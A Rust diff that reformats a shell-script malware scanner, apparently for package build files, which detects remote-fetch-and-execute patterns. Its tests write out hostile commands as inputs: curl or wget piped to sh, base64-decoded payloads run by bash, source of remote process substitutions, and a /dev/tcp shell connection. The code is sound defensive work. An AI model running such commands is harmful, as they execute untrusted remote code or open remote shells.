@@ -54,7 +54,9 @@ fn resolve_word(node: Node, src: &[u8]) -> Option<String> {
 /// Static command name (lowercased), or None if expanded.
 fn command_name_of(command_node: Node, src: &[u8]) -> Option<String> {
     let mut cursor = command_node.walk();
-    let name_node = command_node.children(&mut cursor).find(|c| c.kind() == "command_name")?;
+    let name_node = command_node
+        .children(&mut cursor)
+        .find(|c| c.kind() == "command_name")?;
     let mut c2 = name_node.walk();
     let first_child = name_node.children(&mut c2).next()?;
     resolve_word(first_child, src).map(|s| s.to_lowercase())
@@ -80,7 +82,10 @@ pub(crate) fn curl_pipe_shell(source: &str) -> Option<usize> {
     find_descendants(tree.root_node(), "pipeline", &mut pipelines);
     for pipeline in pipelines {
         let mut cursor = pipeline.walk();
-        let commands: Vec<Node> = pipeline.children(&mut cursor).filter(|c| c.kind() == "command").collect();
+        let commands: Vec<Node> = pipeline
+            .children(&mut cursor)
+            .filter(|c| c.kind() == "command")
+            .collect();
         if commands.len() < 2 {
             continue;
         }
@@ -95,8 +100,14 @@ pub(crate) fn curl_pipe_shell(source: &str) -> Option<usize> {
             // env wrapper: real interpreter is first non-flag arg.
             let effective = if name == "env" {
                 let mut c3 = last.walk();
-                let arg_words: Vec<Node> = last.children(&mut c3).filter(|c| c.kind() == "word").collect();
-                arg_words.into_iter().filter_map(|w| resolve_word(w, src)).find(|w| !w.starts_with('-'))
+                let arg_words: Vec<Node> = last
+                    .children(&mut c3)
+                    .filter(|c| c.kind() == "word")
+                    .collect();
+                arg_words
+                    .into_iter()
+                    .filter_map(|w| resolve_word(w, src))
+                    .find(|w| !w.starts_with('-'))
             } else {
                 Some(name)
             };
@@ -112,11 +123,19 @@ pub(crate) fn curl_pipe_shell(source: &str) -> Option<usize> {
 
 /// True if cmd is a shell (incl. via env wrapper). Shared by decode_pipe_shell.
 fn command_is_shell(cmd: Node, src: &[u8]) -> bool {
-    let Some(name) = command_name_of(cmd, src) else { return false };
+    let Some(name) = command_name_of(cmd, src) else {
+        return false;
+    };
     let effective = if name == "env" {
         let mut c3 = cmd.walk();
-        let arg_words: Vec<Node> = cmd.children(&mut c3).filter(|c| c.kind() == "word").collect();
-        arg_words.into_iter().filter_map(|w| resolve_word(w, src)).find(|w| !w.starts_with('-'))
+        let arg_words: Vec<Node> = cmd
+            .children(&mut c3)
+            .filter(|c| c.kind() == "word")
+            .collect();
+        arg_words
+            .into_iter()
+            .filter_map(|w| resolve_word(w, src))
+            .find(|w| !w.starts_with('-'))
     } else {
         Some(name)
     };
@@ -142,21 +161,30 @@ pub(crate) fn decode_pipe_shell(source: &str) -> Option<usize> {
     find_descendants(tree.root_node(), "pipeline", &mut pipelines);
     for pipeline in pipelines {
         let mut cursor = pipeline.walk();
-        let commands: Vec<Node> = pipeline.children(&mut cursor).filter(|c| c.kind() == "command").collect();
+        let commands: Vec<Node> = pipeline
+            .children(&mut cursor)
+            .filter(|c| c.kind() == "command")
+            .collect();
         if commands.len() < 2 {
             continue;
         }
         let has_decoder = commands[..commands.len() - 1].iter().any(|c| {
-            let Some(name) = command_name_of(*c, src) else { return false };
+            let Some(name) = command_name_of(*c, src) else {
+                return false;
+            };
             if !DECODERS.contains(&name.as_str()) {
                 return false;
             }
-            let flags: Vec<String> = command_arg_words(*c, src).iter().map(|a| a.to_lowercase()).collect();
-            let is_short_flag_containing = |f: &str, ch: char| {
-                f.starts_with('-') && !f.starts_with("--") && f.contains(ch)
-            };
+            let flags: Vec<String> = command_arg_words(*c, src)
+                .iter()
+                .map(|a| a.to_lowercase())
+                .collect();
+            let is_short_flag_containing =
+                |f: &str, ch: char| f.starts_with('-') && !f.starts_with("--") && f.contains(ch);
             match name.as_str() {
-                "base64" => flags.iter().any(|f| f == "-d" || f == "--decode" || is_short_flag_containing(f, 'd')),
+                "base64" => flags
+                    .iter()
+                    .any(|f| f == "-d" || f == "--decode" || is_short_flag_containing(f, 'd')),
                 "xxd" => {
                     let has_r = flags.iter().any(|f| is_short_flag_containing(f, 'r'));
                     let has_p = flags.iter().any(|f| is_short_flag_containing(f, 'p'));
@@ -183,7 +211,9 @@ pub(crate) fn source_process_subst_remote(source: &str) -> Option<usize> {
     let mut commands = Vec::new();
     find_descendants(tree.root_node(), "command", &mut commands);
     for cmd in &commands {
-        let Some(name) = command_name_of(*cmd, src) else { continue };
+        let Some(name) = command_name_of(*cmd, src) else {
+            continue;
+        };
         if name != "source" && name != "." {
             continue;
         }
@@ -192,7 +222,10 @@ pub(crate) fn source_process_subst_remote(source: &str) -> Option<usize> {
         for subst in substs {
             let mut inner = Vec::new();
             find_descendants(subst, "command", &mut inner);
-            if inner.iter().any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str()))) {
+            if inner
+                .iter()
+                .any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str())))
+            {
                 return Some(line_of(*cmd));
             }
         }
@@ -207,7 +240,9 @@ pub(crate) fn eval_remote_exec(source: &str) -> Option<usize> {
     let mut commands = Vec::new();
     find_descendants(tree.root_node(), "command", &mut commands);
     for cmd in &commands {
-        let Some(name) = command_name_of(*cmd, src) else { continue };
+        let Some(name) = command_name_of(*cmd, src) else {
+            continue;
+        };
         if name != "eval" {
             continue;
         }
@@ -216,7 +251,10 @@ pub(crate) fn eval_remote_exec(source: &str) -> Option<usize> {
         for subst in substs {
             let mut inner = Vec::new();
             find_descendants(subst, "command", &mut inner);
-            if inner.iter().any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str()))) {
+            if inner
+                .iter()
+                .any(|c| command_name_of(*c, src).is_some_and(|n| FETCHERS.contains(&n.as_str())))
+            {
                 return Some(line_of(*cmd));
             }
         }
@@ -247,13 +285,17 @@ pub(crate) fn python_inline_exec(source: &str) -> Option<usize> {
     let mut commands = Vec::new();
     find_descendants(tree.root_node(), "command", &mut commands);
     for cmd in commands {
-        let Some(name) = command_name_of(cmd, src) else { continue };
+        let Some(name) = command_name_of(cmd, src) else {
+            continue;
+        };
         if !["python", "python2", "python3"].contains(&name.as_str()) {
             continue;
         }
         let mut cursor = cmd.walk();
         let args: Vec<Node> = cmd.children(&mut cursor).collect();
-        let has_dash_c = args.iter().any(|a| a.kind() == "word" && a.utf8_text(src) == Ok("-c"));
+        let has_dash_c = args
+            .iter()
+            .any(|a| a.kind() == "word" && a.utf8_text(src) == Ok("-c"));
         if !has_dash_c {
             continue;
         }
@@ -261,7 +303,10 @@ pub(crate) fn python_inline_exec(source: &str) -> Option<usize> {
             if matches!(a.kind(), "string" | "raw_string") {
                 if let Some(text) = resolve_word(*a, src) {
                     let lower = text.to_lowercase();
-                    if ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("].iter().any(|p| lower.contains(p)) {
+                    if ["exec(", "eval(", "os.system(", "subprocess.", "os.popen("]
+                        .iter()
+                        .any(|p| lower.contains(p))
+                    {
                         return Some(line_of(cmd));
                     }
                 }
@@ -280,7 +325,9 @@ pub(crate) fn shell_c_exec(source: &str) -> Option<usize> {
     find_descendants(tree.root_node(), "command", &mut commands);
 
     for cmd in commands {
-        let Some(name) = command_name_of(cmd, src) else { continue };
+        let Some(name) = command_name_of(cmd, src) else {
+            continue;
+        };
         if !SHELL_NAMES.contains(&basename(&name)) {
             continue;
         }
@@ -311,7 +358,10 @@ pub(crate) fn shell_c_exec(source: &str) -> Option<usize> {
             }
 
             // first non-flag arg after -c is the script body
-            if matches!(child.kind(), "string" | "raw_string" | "word" | "concatenation") {
+            if matches!(
+                child.kind(),
+                "string" | "raw_string" | "word" | "concatenation"
+            ) {
                 if let Some(text) = resolve_word(*child, src) {
                     if is_suspicious_shell_c_payload(&text) {
                         return Some(line_of(cmd));
@@ -360,7 +410,10 @@ fn is_suspicious_shell_c_payload(text: &str) -> bool {
 
     // multiple staging separators in a moderately long string
     let staging_markers = ["&&", ";", "|", "`", "$("];
-    let marker_count = staging_markers.iter().filter(|m| lower.contains(*m)).count();
+    let marker_count = staging_markers
+        .iter()
+        .filter(|m| lower.contains(*m))
+        .count();
     if len > 80 && marker_count >= 3 {
         return true;
     }
@@ -378,15 +431,22 @@ pub(crate) fn pkgbuild_dependencies(source: &str, current_arch: &str) -> Option<
     let mut assignments = Vec::new();
     find_descendants(tree.root_node(), "variable_assignment", &mut assignments);
 
-    let arch_suffixed: Vec<String> = DEP_ARRAY_NAMES.iter().map(|n| format!("{n}_{current_arch}")).collect();
+    let arch_suffixed: Vec<String> = DEP_ARRAY_NAMES
+        .iter()
+        .map(|n| format!("{n}_{current_arch}"))
+        .collect();
 
     let mut found_any_array = false;
     let mut out = Vec::new();
     for assign in assignments {
         let mut cursor = assign.walk();
         let children: Vec<Node> = assign.children(&mut cursor).collect();
-        let Some(name_node) = children.iter().find(|c| c.kind() == "variable_name") else { continue };
-        let Ok(name) = name_node.utf8_text(src) else { continue };
+        let Some(name_node) = children.iter().find(|c| c.kind() == "variable_name") else {
+            continue;
+        };
+        let Ok(name) = name_node.utf8_text(src) else {
+            continue;
+        };
         if !DEP_ARRAY_NAMES.contains(&name) && !arch_suffixed.iter().any(|a| a == name) {
             continue;
         }
@@ -492,13 +552,25 @@ mod ast_tests {
     #[test]
     fn decode_pipe_shell_base64_and_xxd_caught() {
         assert_eq!(decode_pipe_shell("base64 -d payload.b64 | sh"), Some(1));
-        assert_eq!(decode_pipe_shell("base64 --decode payload.b64 | /bin/bash"), Some(1));
-        assert_eq!(decode_pipe_shell("echo \"$blob\" | base64 -d | env bash"), Some(1));
+        assert_eq!(
+            decode_pipe_shell("base64 --decode payload.b64 | /bin/bash"),
+            Some(1)
+        );
+        assert_eq!(
+            decode_pipe_shell("echo \"$blob\" | base64 -d | env bash"),
+            Some(1)
+        );
         assert_eq!(decode_pipe_shell("xxd -r -p payload.hex | bash"), Some(1));
         assert_eq!(decode_pipe_shell("xxd -rp payload.hex | sh"), Some(1));
         // decoding but writing to a file, not a shell: must not flag
-        assert_eq!(decode_pipe_shell("base64 -d payload.b64 -o payload.bin"), None);
-        assert_eq!(decode_pipe_shell("base64 -d payload.b64 | tee out.bin"), None);
+        assert_eq!(
+            decode_pipe_shell("base64 -d payload.b64 -o payload.bin"),
+            None
+        );
+        assert_eq!(
+            decode_pipe_shell("base64 -d payload.b64 | tee out.bin"),
+            None
+        );
         // xxd without -p (default hex-dump-with-offsets format, not the
         // plain-hex encoding an attacker would actually stash a payload
         // in) shouldn't flag on -r alone
@@ -508,19 +580,33 @@ mod ast_tests {
 
     #[test]
     fn source_process_subst_remote_caught_and_not_false_positive() {
-        assert_eq!(source_process_subst_remote("source <(curl -sSL https://x)"), Some(1));
-        assert_eq!(source_process_subst_remote(". <(wget -qO- https://x)"), Some(1));
+        assert_eq!(
+            source_process_subst_remote("source <(curl -sSL https://x)"),
+            Some(1)
+        );
+        assert_eq!(
+            source_process_subst_remote(". <(wget -qO- https://x)"),
+            Some(1)
+        );
         // a process substitution not fed to source/. shouldn't flag
-        assert_eq!(source_process_subst_remote("diff <(curl -sSL https://x) file.txt"), None);
+        assert_eq!(
+            source_process_subst_remote("diff <(curl -sSL https://x) file.txt"),
+            None
+        );
         // source-ing a local file shouldn't flag
         assert_eq!(source_process_subst_remote("source ./helpers.sh"), None);
-        assert_eq!(source_process_subst_remote("# source <(curl https://x)"), None);
+        assert_eq!(
+            source_process_subst_remote("# source <(curl https://x)"),
+            None
+        );
     }
 
     #[test]
     fn python_inline_exec_caught_and_not_false_positive() {
         assert_eq!(
-            python_inline_exec("python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""),
+            python_inline_exec(
+                "python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""
+            ),
             Some(1)
         );
         assert_eq!(python_inline_exec("python -c 'os.system(\"id\")'"), Some(1));
@@ -538,18 +624,12 @@ mod ast_tests {
             shell_c_exec(r#"bash -c "eval \"\$(base64 -d <<< '...')\"""#),
             Some(1)
         );
-        assert_eq!(
-            shell_c_exec("dash -c 'wget -qO- http://x | sh'"),
-            Some(1)
-        );
+        assert_eq!(shell_c_exec("dash -c 'wget -qO- http://x | sh'"), Some(1));
         assert_eq!(
             shell_c_exec(r#"/bin/bash -c 'python3 -c "import os; os.system(\"id\")"'"#),
             Some(1)
         );
-        assert_eq!(
-            shell_c_exec("sh -c '/dev/tcp/1.2.3.4/443'"),
-            Some(1)
-        );
+        assert_eq!(shell_c_exec("sh -c '/dev/tcp/1.2.3.4/443'"), Some(1));
     }
 
     #[test]
@@ -574,10 +654,7 @@ mod ast_tests {
 
     #[test]
     fn shell_c_exec_handles_combined_flags_and_concat() {
-        assert_eq!(
-            shell_c_exec(r#"sh -ec 'curl -s http://x | sh'"#),
-            Some(1)
-        );
+        assert_eq!(shell_c_exec(r#"sh -ec 'curl -s http://x | sh'"#), Some(1));
         // concatenation on the shell name itself
         assert_eq!(
             shell_c_exec(r#"s""h -c 'wget -qO- http://x | bash'"#),
@@ -613,15 +690,23 @@ build() {
         // legitimate: command substitution *inside* a function body only
         // runs when makepkg calls that function, not on a bare source.
         assert_eq!(
-            top_level_command_substitution("pkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n"),
+            top_level_command_substitution(
+                "pkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n"
+            ),
             None
         );
         assert_eq!(
             top_level_command_substitution("pkgver() {\n  echo \"$(git describe)\"\n}\n"),
             None
         );
-        assert_eq!(top_level_command_substitution("pkgdesc=\"a perfectly normal package\""), None);
-        assert_eq!(top_level_command_substitution("# pkgdesc=\"$(curl https://x)\""), None);
+        assert_eq!(
+            top_level_command_substitution("pkgdesc=\"a perfectly normal package\""),
+            None
+        );
+        assert_eq!(
+            top_level_command_substitution("# pkgdesc=\"$(curl https://x)\""),
+            None
+        );
     }
 
     #[test]
